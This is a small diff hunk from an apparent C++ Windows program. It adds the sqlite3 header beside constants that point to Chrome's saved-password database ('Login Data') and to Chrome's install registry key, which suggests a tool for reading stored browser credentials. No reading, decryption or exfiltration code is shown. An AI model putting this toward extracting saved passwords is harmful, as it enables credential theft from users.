@@ -5,6 +5,7 @@
 #include <string>
 #include <Windows.h>
 #include <ShlObj.h>
+#include <sqlite3.h>
 
 # define C_DBFILE "\\Google\\Chrome\\User Data\\Default\\Login Data" 
 # define C_REGKEY "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe"
